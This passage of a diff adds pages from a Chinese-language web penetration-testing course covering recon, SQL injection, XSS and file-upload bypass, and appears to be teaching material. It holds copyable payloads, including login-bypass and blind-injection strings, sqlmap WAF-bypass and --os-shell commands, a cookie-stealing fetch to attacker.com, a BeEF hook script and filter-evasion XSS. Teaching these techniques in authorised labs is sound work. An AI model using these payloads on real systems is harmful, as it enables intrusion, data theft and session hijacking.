+<span class="cm"># Ctrl+I  →  Send to Intruder</span>
+<span class="cm"># Ctrl+U  →  URL 解碼選中文本</span>
+<span class="cm"># Ctrl+Shift+B  →  Base64 解碼選中文本</span></pre>
+</div>
+
+<div class="note tip">
+  <div class="note-lbl">Pro 版獲取建議</div>
+  <p>Burp Suite Community 版免費但功能受限（掃描模組缺失、Intruder 限速）。學習初期 Community 版足夠使用。進入實際項目時，建議購買 Professional 版（官網約 $449/年），它是滲透測試工作中最值得投資的工具之一，ROI 極高。</p>
+</div>
+</div>
+
+<!-- ===== L1-3 情報收集 ===== -->
+<div class="cb" id="l1-3">
+<h2>情報收集：資產發現與子域名枚舉</h2>
+<p>「知己知彼，百戰不殆」。情報收集（Recon）是決定滲透測試能否成功的第一步。許多成功的滲透攻擊都源於在前期發現了一個被遺忘的測試子域名或過時系統。</p>
+
+<h3>被動偵察（OSINT）</h3>
+<div class="ilist">
+  <div class="il-item"><span class="il-num">01</span><div class="il-txt"><strong>WHOIS / 域名信息</strong> — 獲取域名注册人、郵件、地址、域名伺服器。工具：<code>whois example.com</code>、站長工具</div></div>
+  <div class="il-item"><span class="il-num">02</span><div class="il-txt"><strong>Google Hacking（Google Dork）</strong> — 利用 Google 高級搜索語法（如 <code>site:target.com filetype:pdf</code>、<code>inurl:admin</code>）發現洩露的文件和敏感頁面</div></div>
+  <div class="il-item"><span class="il-num">03</span><div class="il-txt"><strong>Shodan / FOFA / Censys</strong> — 網路空間搜尋引擎，可搜索暴露在公網的服務、設備和已知漏洞。<code>org:"Target Corp"</code> 可找出所有屬於目標的 IP</div></div>
+  <div class="il-item"><span class="il-num">04</span><div class="il-txt"><strong>SecurityTrails / Wayback Machine</strong> — 查看歷史 DNS 記錄（可能洩露真實 IP）和歷史網頁快照（可能包含已刪除的敏感內容）</div></div>
+  <div class="il-item"><span class="il-num">05</span><div class="il-txt"><strong>GitHub / GitLab 代碼洩露</strong> — 搜索 <code>target.com password</code>、<code>target.com api_key</code> 等，開發者不小心上傳的配置文件可能包含資料庫密碼、API Key 等</div></div>
+</div>
+
+<h3>主動偵察（Active Recon）</h3>
+<div class="cblock">
+  <div class="ctop"><span class="clang">主動偵察工具命令集</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── 子域名枚舉 ───</span>
+<span class="cm"># subfinder：快速被動枚舉（推薦）</span>
+subfinder -d target.com -o subdomains.txt
+
+<span class="cm"># amass：最全面的子域名枚舉工具</span>
+amass enum -d target.com
+
+<span class="cm"># 爆破子域名（字典攻擊）</span>
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+     -u https://FUZZ.target.com -mc 200,301,302
+
+<span class="cm"># ─── 端口掃描 ───</span>
+<span class="cm"># 全端口快速掃描（先找開放端口）</span>
+nmap -p- --min-rate 5000 -T4 target.com -oN ports.txt
+
+<span class="cm"># 對開放端口做服務版本和腳本掃描</span>
+nmap -sV -sC -p 80,443,8080,3306 target.com
+
+<span class="cm"># ─── 目錄與文件枚舉 ───</span>
+<span class="cm"># ffuf（最快）</span>
+ffuf -w /usr/share/wordlists/dirb/big.txt \
+     -u https://target.com/FUZZ -mc 200,301,302,403
+
+<span class="cm"># gobuster</span>
+gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+<span class="cm"># ─── Google Dork 示例 ───</span>
+<span class="cm"># site:target.com filetype:sql          → 洩露的資料庫備份</span>
+<span class="cm"># site:target.com inurl:admin           → 後台管理入口</span>
+<span class="cm"># site:target.com ext:php inurl:?       → 帶參數的 PHP 頁面（SQL注入入口）</span>
+<span class="cm"># site:github.com "target.com" password → GitHub 代碼洩露</span></pre>
+</div>
+</div>
+
+<!-- ===== L1-4 指紋識別 ===== -->
+<div class="cb" id="l1-4">
+<h2>指紋識別與漏洞掃描</h2>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">指紋識別與掃描工具</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── Web 指紋識別 ───</span>
+<span class="cm"># whatweb：識別 CMS、框架、服務器版本</span>
+whatweb https://target.com
+
+<span class="cm"># wappalyzer：瀏覽器插件，實時識別頁面技術棧</span>
+
+<span class="cm"># ─── CMS 專項掃描 ───</span>
+<span class="cm"># WordPress 掃描（找插件漏洞、用戶枚舉）</span>
+wpscan --url https://target.com --enumerate u,p
+
+<span class="cm"># Joomla 掃描</span>
+joomscan -u https://target.com
+
+<span class="cm"># ─── 漏洞掃描 ───</span>
+<span class="cm"># Nikto：Web 服務器漏洞掃描（噪音大，不要在未授權目標使用！）</span>
+nikto -h https://target.com -o nikto.txt
+
+<span class="cm"># Nuclei：模板化漏洞掃描，覆蓋 CVE、錯誤配置、信息洩露</span>
+nuclei -u https://target.com -t cves/ -t exposures/ -o nuclei.txt
+
+<span class="cm"># ─── 識別 WAF ───</span>
+wafw00f https://target.com
+
+<span class="cm"># ─── Shodan 搜索（被動）───</span>
+<span class="cm"># 需要 API key，在 Kali 配置：</span>
+shodan init YOUR_API_KEY
+shodan host 1.2.3.4          <span class="cm"># 查看特定 IP 的開放服務</span>
+shodan search 'org:"Target" port:8080'</pre>
+</div>
+
+<div class="note tip">
+  <div class="note-lbl">情報收集的黃金原則</div>
+  <p>情報收集做得越充分，後面的漏洞挖掘越高效。花 30% 的時間在情報收集上，可以節省 70% 的測試時間。重點關注：<strong>被遺忘的測試環境、過時的第三方插件版本、洩露的認證信息、暴露的管理後台</strong>。這些往往是最容易突破的入口。</p>
+</div>
+
+<div class="quiz">
+  <div class="q-lbl">小測驗</div>
+  <div class="q-q">在滲透測試的情報收集階段，你發現目標公司在 GitHub 上有一個公開倉庫，其中一個配置文件包含 MySQL 資料庫的連接字符串和明文密碼。這種情況屬於什麼問題？</div>
+  <div class="q-opts">
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">A</span>SQL 注入漏洞，需要進一步利用</div>
+    <div class="qo" onclick="chkQ(this,true)"><span class="qo-k">B</span>敏感信息洩露（代碼倉庫洩露），屬於 OWASP A02 加密機制失效類別</div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">C</span>這不算漏洞，因為 GitHub 是公開平台</div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">D</span>XSS 漏洞，需要注入 JavaScript 來利用</div>
+  </div>
+  <div class="q-exp">正確！這是典型的「代碼倉庫敏感信息洩露」，屬於 OWASP Top 10 A02（加密機制失效/敏感數據洩露）。開發者不小心將含有數據庫密碼的配置文件（如 .env、config.php、application.yml）提交到公開倉庫。正確處理：立即在 GitHub 的 Security Advisories 中報告，並建議客戶立即更換密碼（即使刪除文件，git 歷史記錄中仍可找到）。</div>
+</div>
+</div>
+
+
+<!-- ===== CH2: SQL 注入 ===== -->
+<!-- L2-1 SQL 注入原理 -->
+<div class="cb" id="l2-1">
+<h2>SQL 注入原理與手工測試</h2>
+<p>SQL 注入（SQL Injection）是 Web 安全中持續時間最長、危害最廣的漏洞類型。理解手工注入的原理，才能在面對 WAF 或特殊環境時不依賴工具。</p>
+
+<h3>尋找注入點</h3>
+<p>任何將用戶輸入傳遞給後端資料庫的地方都是潛在注入點：URL 參數（GET）、表單（POST）、HTTP Header（User-Agent/Cookie/X-Forwarded-For）、搜索框、排序參數等。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">SQL 注入 — 判斷是否存在注入點</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">-- ─── 步驟1：判斷是否存在注入 ───</span>
+<span class="cm">-- 原始請求：https://target.com/item.php?id=1</span>
+
+<span class="cm">-- 加單引號，觀察是否報錯</span>
+https://target.com/item.php<span class="hl">?id=1'</span>
+<span class="cm">-- 報錯（You have an error in your SQL syntax）→ 存在注入，且有報錯回顯</span>
+
+<span class="cm">-- 數字型注入判斷（and 1=1 vs and 1=2）</span>
+https://target.com/item.php?id=1 <span class="hl">and 1=1</span>   <span class="cm">-- 頁面正常</span>
+https://target.com/item.php?id=1 <span class="hl">and 1=2</span>   <span class="cm">-- 頁面異常/無內容 → 存在注入</span>
+
+<span class="cm">-- 字串型注入判斷</span>
+https://target.com/search.php?q=test<span class="hl">'</span>         <span class="cm">-- 報錯</span>
+https://target.com/search.php?q=test<span class="hl">'--</span>       <span class="cm">-- 正常 → 存在注入</span>
+
+<span class="cm">-- ─── 步驟2：判斷欄位數（ORDER BY 試探法）───</span>
+id=1 ORDER BY 1--    <span class="cm">-- 正常</span>
+id=1 ORDER BY 2--    <span class="cm">-- 正常</span>
+id=1 ORDER BY 3--    <span class="cm">-- 正常</span>
+id=1 ORDER BY 4--    <span class="cm">-- 報錯 → 查詢有 3 個欄位</span>
+
+<span class="cm">-- ─── 步驟3：找到顯示位（回顯位）───</span>
+id=-1 UNION SELECT 1,2,3--
+<span class="cm">-- 頁面顯示出 "2" → 顯示位是第2個欄位</span></pre>
+</div>
+
+<h3>常見 SQL 注入繞過登入</h3>
+<div class="cblock">
+  <div class="ctop"><span class="clang">SQL 注入 — 常見攻擊 Payload</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">-- ─── 繞過登入認證（在 username 欄位輸入）───</span>
+admin'--
+admin'#
+admin' OR 1=1--
+admin' OR '1'='1
+' OR 1=1--
+' OR ''='
+') OR ('1'='1
+
+<span class="cm">-- ─── 不同資料庫的注釋符 ───</span>
+--          <span class="cm">-- MySQL / MSSQL（注意後面有空格）</span>
+#           <span class="cm">-- MySQL 專屬（URL 編碼：%23）</span>
+/**/        <span class="cm">-- 通用，可用於空格替換</span>
+/*!*/       <span class="cm">-- MySQL 條件注釋，可繞過部分 WAF</span>
+
+<span class="cm">-- ─── 空格替換技巧（WAF 繞過）───</span>
+SELECT/**/username/**/FROM/**/users
+SELECT%09username%09FROM%09users   <span class="cm">-- Tab 替換空格</span>
+SELECT(username)FROM(users)</pre>
+</div>
+
+<div class="note danger">
+  <div class="note-lbl">僅限授權環境</div>
+  <p>以上所有 Payload 僅可在您的本地靶機（DVWA/Vulhub）或已取得書面授權的測試環境中使用。對任何未授權系統測試 SQL 注入是違法行為。</p>
+</div>
+</div>
+
+<!-- L2-2 UNION/錯誤注入 -->
+<div class="cb" id="l2-2">
+<h2>聯合查詢注入 / 報錯注入</h2>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">UNION 聯合查詢注入 — 完整流程</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">-- 已知：查詢有 3 個欄位，顯示位在第 2、3 個欄位</span>
+
+<span class="cm">-- 步驟1：獲取當前資料庫名</span>
+id=-1 UNION SELECT 1,database(),3--
+<span class="cm">-- 頁面顯示：dvwa（當前資料庫名）</span>
+
+<span class="cm">-- 步驟2：獲取所有資料表名</span>
+id=-1 UNION SELECT 1,group_concat(table_name),3
+FROM information_schema.tables
+WHERE table_schema=database()--
+<span class="cm">-- 頁面顯示：guestbook,users</span>
+
+<span class="cm">-- 步驟3：獲取 users 表的所有欄位名</span>
+id=-1 UNION SELECT 1,group_concat(column_name),3
+FROM information_schema.columns
+WHERE table_name='users'--
+<span class="cm">-- 頁面顯示：user_id,first_name,last_name,user,password,avatar</span>
+
+<span class="cm">-- 步驟4：提取數據（帳號+密碼）</span>
+id=-1 UNION SELECT 1,group_concat(user,'~',password SEPARATOR '\n'),3
+FROM users--
+<span class="cm">-- 頁面顯示：admin~5f4dcc3b5aa765d61d8327deb882cf99（MD5 hash）</span>
+
+<span class="cm">-- 步驟5：Crack 密碼 Hash</span>
+<span class="cm">-- 使用 john、hashcat 或 crackstation.net 在線破解</span></pre>
+</div>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">報錯注入（Error-based Injection）</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">-- 適用場景：頁面顯示 SQL 錯誤信息，但沒有正常的顯示位</span>
+
+<span class="cm">-- extractvalue 報錯注入（MySQL 5.1+）</span>
+id=1 AND extractvalue(1,concat(0x7e,database()))--
+<span class="cm">-- 錯誤信息：XPATH syntax error: '~dvwa'  ← 資料庫名在波浪號後面！</span>
+
+<span class="cm">-- updatexml 報錯注入</span>
+id=1 AND updatexml(1,concat(0x7e,user()),1)--
+<span class="cm">-- 錯誤信息：XPATH syntax error: '~root@localhost'</span>
+
+<span class="cm">-- 報錯注入獲取所有表名</span>
+id=1 AND extractvalue(1,concat(0x7e,
+  (SELECT group_concat(table_name) FROM information_schema.tables
+   WHERE table_schema=database())))--
+<span class="cm">-- 注意：extractvalue 每次最多顯示 32 個字元，超出需要用 SUBSTR 分段獲取</span></pre>
+</div>
+</div>
+
+<!-- L2-3 盲注 -->
+<div class="cb" id="l2-3">
+<h2>布林盲注 / 時間盲注</h2>
+<p>當頁面沒有任何 SQL 回顯，也沒有報錯信息時，就需要使用「盲注」技術。盲注相當於在黑暗中與資料庫對話，通過「是/否」的響應差異逐步提取數據。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">布林盲注 — 手工逐字元提取</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">-- 場景：注入點存在，但頁面只顯示"存在"或"不存在"，無其他信息</span>
+
+<span class="cm">-- ─── 步驟1：確認布林盲注存在 ───</span>
+id=1 AND 1=1--    <span class="cm">-- 頁面顯示"存在" → 真</span>
+id=1 AND 1=2--    <span class="cm">-- 頁面顯示"不存在" → 假</span>
+<span class="cm">-- 兩個響應不同 → 布林盲注確認</span>
+
+<span class="cm">-- ─── 步驟2：猜測資料庫名長度 ───</span>
+id=1 AND length(database())=4--   <span class="cm">-- 如果為真，資料庫名長度是4</span>
+
+<span class="cm">-- ─── 步驟3：逐字元猜測資料庫名 ───</span>
+id=1 AND substr(database(),1,1)='d'--  <span class="cm">-- 第1個字是 'd'？</span>
+id=1 AND substr(database(),2,1)='v'--  <span class="cm">-- 第2個字是 'v'？</span>
+id=1 AND substr(database(),3,1)='w'--  <span class="cm">-- 第3個字是 'w'？</span>
+id=1 AND substr(database(),4,1)='a'--  <span class="cm">-- 第4個字是 'a'？→ 資料庫名：dvwa</span>
+
+<span class="cm">-- 使用 ASCII 數值比較（更精確，可二分搜索加速）</span>
+id=1 AND ascii(substr(database(),1,1))>100--
+id=1 AND ascii(substr(database(),1,1))>110--
+id=1 AND ascii(substr(database(),1,1))=100--  <span class="cm">-- 100=d</span></pre>
+</div>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">時間盲注 — SLEEP 函數判斷</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">-- 場景：頁面無論真假都顯示相同內容，但可觀察響應時間差異</span>
+
+<span class="cm">-- 確認時間盲注存在（如果延遲 5 秒，注入存在）</span>
+id=1 AND sleep(5)--
+id=1 AND if(1=1,sleep(5),0)--
+
+<span class="cm">-- 逐字元提取（True → 延遲 5 秒，False → 立即響應）</span>
+id=1 AND if(substr(database(),1,1)='d',sleep(5),0)--
+
+<span class="cm">-- 完整提取資料庫名（每個字元測試）</span>
+id=1 AND if(ascii(substr(database(),1,1))=100,sleep(3),0)--
+<span class="cm">-- 延遲 3 秒 → 第1個字元 ASCII=100='d'</span>
+
+<span class="cm">-- ─── 時間盲注的實際效率問題 ───</span>
+<span class="cm">-- 手工時間盲注極慢（提取10個字元=至少50次請求）</span>
+<span class="cm">-- 實際使用 sqlmap --technique=T 自動化處理</span></pre>
+</div>
+</div>
+
+<!-- L2-4 sqlmap -->
+<div class="cb" id="l2-4">
+<h2>sqlmap 自動化利用與繞過技巧</h2>
+<p>sqlmap 是業界標準的 SQL 注入自動化工具，能自動完成注入點檢測、數據提取、甚至 GetShell 的全流程。但理解它背後的原理（上面三節）才能在 WAF 或特殊場景下靈活調整。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">sqlmap — 常用命令大全</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── 基本使用 ───</span>
+<span class="cm"># 測試 GET 參數</span>
+sqlmap -u "http://target.com/item.php?id=1" --dbs
+
+<span class="cm"># 測試 POST 表單（先用 Burp 保存請求為文件）</span>
+sqlmap -r request.txt --dbs
+
+<span class="cm"># ─── 逐步提取數據 ───</span>
+sqlmap -u "http://target.com/?id=1" --dbs          <span class="cm"># 獲取所有資料庫</span>
+sqlmap -u "http://target.com/?id=1" -D mydb --tables   <span class="cm"># 獲取 mydb 的所有表</span>
+sqlmap -u "http://target.com/?id=1" -D mydb -T users --columns  <span class="cm"># 獲取欄位</span>
+sqlmap -u "http://target.com/?id=1" -D mydb -T users -C user,password --dump  <span class="cm"># 導出數據</span>
+
+<span class="cm"># ─── 常用參數 ───</span>
+--level=5          <span class="cm"># 測試深度（1-5，默認1），越高越全面但越慢</span>
+--risk=3           <span class="cm"># 風險等級（1-3），3 包含 UPDATE 等高風險注入</span>
+--dbms=mysql       <span class="cm"># 指定資料庫類型（加快速度）</span>
+--technique=BEUST  <span class="cm"># 限定注入技術：B布林 E報錯 U聯合 S堆疊 T時間</span>
+--batch            <span class="cm"># 全自動，不問確認（-y）</span>
+--threads=10       <span class="cm"># 並發線程數（加快速度）</span>
+--os-shell         <span class="cm"># 嘗試獲取操作系統 Shell（需要高權限）</span>
+
+<span class="cm"># ─── WAF 繞過技巧 ───</span>
+--tamper=space2comment    <span class="cm"># 用 /**/ 替換空格</span>
+--tamper=randomcase       <span class="cm"># 隨機大小寫（SeLeCt）</span>
+--tamper=between          <span class="cm"># 用 BETWEEN 替換 > 符號</span>
+--tamper=base64encode     <span class="cm"># Base64 編碼 Payload</span>
+--tamper=charencode       <span class="cm"># URL 編碼特殊字符</span>
+
+<span class="cm"># 組合多個 tamper（最常用的 WAF 繞過組合）</span>
+sqlmap -u "http://target.com/?id=1" --dbs \
+  --tamper=space2comment,randomcase,between \
+  --random-agent --delay=1</pre>
+</div>
+
+<div class="quiz">
+  <div class="q-lbl">小測驗</div>
+  <div class="q-q">在測試一個 SQL 注入點時，你發現輸入 <code>1 AND 1=1--</code> 時頁面顯示商品，輸入 <code>1 AND 1=2--</code> 時頁面為空，但頁面上看不到任何報錯信息，也沒有顯示查詢結果的位置。這是哪種注入類型？</div>
+  <div class="q-opts">
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">A</span>聯合查詢注入（UNION）</div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">B</span>報錯注入（Error-based）</div>
+    <div class="qo" onclick="chkQ(this,true)"><span class="qo-k">C</span>布林盲注（Boolean-based Blind）</div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">D</span>時間盲注（Time-based Blind）</div>
+  </div>
+  <div class="q-exp">正確！「有響應差異（一個顯示內容，一個不顯示），但沒有直接回顯查詢結果或報錯信息」是布林盲注的典型特徵。聯合查詢注入需要有顯示位；報錯注入需要頁面顯示 SQL 錯誤；時間盲注則是真假響應在頁面內容上完全一致，只能通過延遲時間來判斷。</div>
+</div>
+</div>
+
+
+<!-- ===== CH3: XSS ===== -->
+<div class="cb" id="l3-1">
+<h2>XSS 三大類型與利用原理</h2>
+<p>XSS（Cross-Site Scripting）跨站腳本攻擊，讓攻擊者在受害者的瀏覽器中執行惡意 JavaScript。注意：XSS 攻擊的是<strong>用戶</strong>，而非伺服器。</p>
+
+<div class="kg">
+  <div class="kt"><div class="kt-n">反射型 XSS（Reflected）</div><div class="kt-d">惡意腳本包含在 URL 中，伺服器將輸入反射回響應頁面但不存儲。攻擊者需誘使受害者點擊含惡意 URL 的連結。常見於搜索框、錯誤頁面。<br><code>?search=&lt;script&gt;alert(1)&lt;/script&gt;</code></div></div>
+  <div class="kt"><div class="kt-n">存儲型 XSS（Stored）</div><div class="kt-d">惡意腳本被持久化存儲到資料庫中，所有訪問該頁面的用戶都受影響。危害最大。常見於留言板、評論區、個人簡介等。</div></div>
+  <div class="kt"><div class="kt-n">DOM 型 XSS</div><div class="kt-d">漏洞在客戶端 JavaScript 代碼中，通過修改頁面 DOM 觸發，請求不一定到達伺服器。需要審計 JS 代碼中的危險 sink（如 innerHTML、document.write）。</div></div>
+  <div class="kt"><div class="kt-n">XSS 主要利用方向</div><div class="kt-d">① Cookie 竊取 / Session 劫持<br>② 釣魚頁面（偽造登入框）<br>③ 鍵盤記錄<br>④ 截圖（通過 Canvas API）<br>⑤ 控制受害者瀏覽器（BeEF）</div></div>
+</div>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">XSS Payload 技巧集合</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">// ─── 基礎驗證 ───</span>
+<span class="op">&lt;</span>script<span class="op">&gt;</span>alert(1)<span class="op">&lt;/</span>script<span class="op">&gt;</span>
+<span class="op">&lt;</span>script<span class="op">&gt;</span>alert(document.domain)<span class="op">&lt;/</span>script<span class="op">&gt;</span>
+<span class="op">&lt;</span>script<span class="op">&gt;</span>alert(document.cookie)<span class="op">&lt;/</span>script<span class="op">&gt;</span>
+
+<span class="cm">// ─── Cookie 竊取到攻擊者伺服器 ───</span>
+<span class="op">&lt;</span>script<span class="op">&gt;</span>
+  fetch(<span class="st">'https://attacker.com/steal?c='</span> + btoa(document.cookie))
+<span class="op">&lt;/</span>script<span class="op">&gt;</span>
+
+<span class="cm">// ─── 不需要 script 標籤的 XSS ───</span>
+<span class="op">&lt;</span>img src=x onerror=<span class="st">"alert(1)"</span><span class="op">&gt;</span>
+<span class="op">&lt;</span>svg onload=<span class="st">"alert(1)"</span><span class="op">&gt;</span>
+<span class="op">&lt;</span>body onload=<span class="st">"alert(1)"</span><span class="op">&gt;</span>
+<span class="op">&lt;</span>video src=1 onerror=<span class="st">"alert(1)"</span><span class="op">&gt;</span>
+
+<span class="cm">// ─── JavaScript 偽協議 ───</span>
+<span class="op">&lt;</span>a href=<span class="st">"javascript:alert(1)"</span><span class="op">&gt;</span>點我<span class="op">&lt;/</span>a<span class="op">&gt;</span>
+
+<span class="cm">// ─── DOM XSS 示例（JS 代碼中的漏洞）───</span>
+<span class="cm">// 漏洞代碼：直接使用 innerHTML</span>
+document.getElementById(<span class="st">'msg'</span>).innerHTML = location.hash.slice(1);
+<span class="cm">// 利用：URL 為 https://target.com/#&lt;img src=x onerror=alert(1)&gt;</span></pre>
+</div>
+</div>
+
+<!-- L3-2 XSS 繞過 -->
+<div class="cb" id="l3-2">
+<h2>XSS 過濾繞過技巧</h2>
+<div class="cblock">
+  <div class="ctop"><span class="clang">XSS 過濾繞過技巧大全</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">// ─── 繞過大小寫過濾 ───</span>
+<span class="op">&lt;</span>SCRIPT<span class="op">&gt;</span>alert(1)<span class="op">&lt;/</span>SCRIPT<span class="op">&gt;</span>
+<span class="op">&lt;</span>ScRiPt<span class="op">&gt;</span>alert(1)<span class="op">&lt;/</span>sCrIpT<span class="op">&gt;</span>
+
+<span class="cm">// ─── 繞過 &lt;script&gt; 標籤過濾（用事件觸發）───</span>
+<span class="op">&lt;</span>img src=x onerror=<span class="st">"alert(1)"</span><span class="op">&gt;</span>
+<span class="op">&lt;</span>input autofocus onfocus=<span class="st">"alert(1)"</span><span class="op">&gt;</span>
+<span class="op">&lt;</span>details open ontoggle=<span class="st">"alert(1)"</span><span class="op">&gt;</span>
+
+<span class="cm">// ─── 編碼繞過 ───</span>
+<span class="cm">// HTML 實體編碼</span>
+<span class="op">&lt;</span>img src=x onerror=<span class="st">"&#97;&#108;&#101;&#114;&#116;(1)"</span><span class="op">&gt;</span>
+<span class="cm">// JavaScript Unicode 編碼</span>
+<span class="op">&lt;</span>script<span class="op">&gt;\u0061\u006c\u0065\u0072\u0074(1)<span class="op">&lt;/</span>script<span class="op">&gt;</span>
+
+<span class="cm">// ─── 繞過引號過濾 ───</span>
+<span class="op">&lt;</span>img src=x onerror=alert(1)<span class="op">&gt;</span>           <span class="cm">// 不使用引號</span>
+<span class="op">&lt;</span>img src=x onerror=alert`1`<span class="op">&gt;</span>          <span class="cm">// 模板字符串</span>
+
+<span class="cm">// ─── 繞過 alert 關鍵字過濾 ───</span>
+<span class="op">&lt;</span>script<span class="op">&gt;</span>confirm(1)<span class="op">&lt;/</span>script<span class="op">&gt;</span>
+<span class="op">&lt;</span>script<span class="op">&gt;</span>prompt(1)<span class="op">&lt;/</span>script<span class="op">&gt;</span>
+<span class="op">&lt;</span>script<span class="op">&gt;</span>eval(atob('YWxlcnQoMSk='))<span class="op">&lt;/</span>script<span class="op">&gt;</span>  <span class="cm">// Base64: alert(1)</span>
+
+<span class="cm">// ─── 繞過長度限制 ───</span>
+<span class="cm">// 場景：輸入框限制 20 字元以內</span>
+<span class="op">&lt;</span>svg onload=alert(1)<span class="op">&gt;</span>              <span class="cm">// 20 字元！</span></pre>
+</div>
+
+<div class="note sec">
+  <div class="note-lbl">XSS 防禦的正確方法</div>
+  <p>① <code>htmlspecialchars()</code> 對所有輸出做 HTML 實體編碼<br>
+  ② 設置 Content Security Policy（CSP）HTTP Header，限制可執行的腳本來源<br>
+  ③ Cookie 設置 <code>HttpOnly</code> 屬性（JS 無法讀取），<code>Secure</code> 屬性（僅 HTTPS 傳輸）<br>
+  ④ 使用框架內建的 XSS 防護（React/Vue 默認對 innerHTML 進行轉義）</p>
+</div>
+</div>
+
+<!-- L3-3 BeEF -->
+<div class="cb" id="l3-3">
+<h2>BeEF 框架：瀏覽器控制攻擊</h2>
+<p>BeEF（Browser Exploitation Framework）是一個基於 XSS 的瀏覽器攻擊框架，可以通過一個 XSS 漏洞控制受害者的整個瀏覽器，執行多種攻擊操作。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">BeEF — 基本使用</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># 啟動 BeEF（Kali 已預裝）</span>
+cd /usr/share/beef-xss
+./beef
+
+<span class="cm"># 訪問 BeEF 管理面板</span>
+<span class="cm"># http://127.0.0.1:3000/ui/panel</span>
+<span class="cm"># 預設帳號：beef / beef</span>
+
+<span class="cm"># ─── Hook Payload（注入到存在 XSS 的頁面）───</span>
+<span class="op">&lt;</span>script src=<span class="st">"http://YOUR_IP:3000/hook.js"</span><span class="op">&gt;&lt;/</span>script<span class="op">&gt;</span>
+
+<span class="cm"># 受害者的瀏覽器一旦載入這個頁面，就會出現在 BeEF 的 "Hooked Browsers" 列表中</span>
+<span class="cm"># 可以執行的操作包括：
+#   - 顯示假冒的系統彈窗（社工攻擊）
+#   - 重定向到釣魚頁面
+#   - 獲取瀏覽器信息、地理位置
+#   - 截圖當前頁面
+#   - 鍵盤記錄（如果頁面有輸入框）
+#   - 掃描內網（利用受害者瀏覽器探測內網）</span></pre>
+</div>
+
+<div class="note atk">
+  <div class="note-lbl">實際應用場景</div>
+  <p>在授權的紅隊演練中，BeEF 常用於演示 XSS 漏洞的真實影響。一個存儲型 XSS + BeEF Hook，可以讓所有訪問論壇的管理員瀏覽器都被控制，這對業務影響的演示非常有說服力。</p>
+</div>
+</div>
+
+<!-- ===== CH4: 文件上傳 ===== -->
+<div class="cb" id="l4-1">
+<h2>文件上傳漏洞全面剖析</h2>
+<p>文件上傳漏洞是最直接的 GetShell 方式之一。當伺服器允許上傳惡意的可執行腳本文件（如 PHP、ASP），攻擊者即可獲取伺服器控制權。</p>
+
+<h3>後端驗證類型</h3>
+<div class="tbl">
+  <table class="t">
+    <thead><tr><th>驗證類型</th><th>說明</th><th>是否可靠</th></tr></thead>
+    <tbody>
+      <tr><td><strong>前端 JS 驗證</strong></td><td>JavaScript 在瀏覽器端限制文件類型</td><td class="mc" style="color:var(--red)">極不可靠：Burp 攔截繞過</td></tr>
+      <tr><td><strong>MIME 類型驗證</strong></td><td>檢查 Content-Type 頭（如 image/jpeg）</td><td class="mc" style="color:var(--red)">不可靠：Burp 可隨意修改</td></tr>
+      <tr><td><strong>後綴名黑名單</strong></td><td>禁止 .php、.jsp 等後綴</td><td class="mc" style="color:var(--org)">有限：可用等效後綴繞過</td></tr>
+      <tr><td><strong>後綴名白名單</strong></td><td>只允許 .jpg、.png 等特定後綴</td><td class="mc" style="color:var(--ylw)">較可靠：但需配合服務器配置</td></tr>
+      <tr><td><strong>文件頭（魔數）驗證</strong></td><td>讀取文件前幾個字節判斷真實類型</td><td class="mc" style="color:var(--ylw)">較可靠：但可用圖片木馬繞過</td></tr>
+      <tr><td><strong>上傳至 Web 根目錄外</strong></td><td>文件存放到無法直接訪問的目錄</td><td class="mc" style="color:var(--grn)">最可靠：根本防止解析執行</td></tr>
+    </tbody>
+  </table>
+</div>
+</div>
+
+<!-- L4-2 文件上傳繞過 -->
+<div class="cb" id="l4-2">
+<h2>文件上傳繞過技巧</h2>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">文件上傳繞過技術集合</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── 1. 繞過前端 JS 驗證 ───</span>
+<span class="cm"># 方法：用 Burp 攔截請求，或右鍵禁用 JS，或直接用 curl 上傳</span>
+curl -X POST -F "file=@shell.php" http://target.com/upload.php
+
+<span class="cm"># ─── 2. 繞過 MIME 類型檢測 ───</span>
+<span class="cm"># 用 Burp 修改 Content-Type 頭：</span>
+<span class="cm"># 原始：Content-Type: application/x-php</span>
+<span class="cm"># 修改後：Content-Type: image/jpeg</span>
+
+<span class="cm"># ─── 3. 繞過後綴名黑名單 ───</span>
+shell.php3   shell.php4   shell.php5   shell.phtml
+shell.pHp    shell.PHP    shell.Php    <span class="cm"># 大小寫繞過（Windows 不區分大小寫）</span>
+shell.php.   shell.php_    <span class="cm"># 尾部特殊字符（Windows 解析）</span>
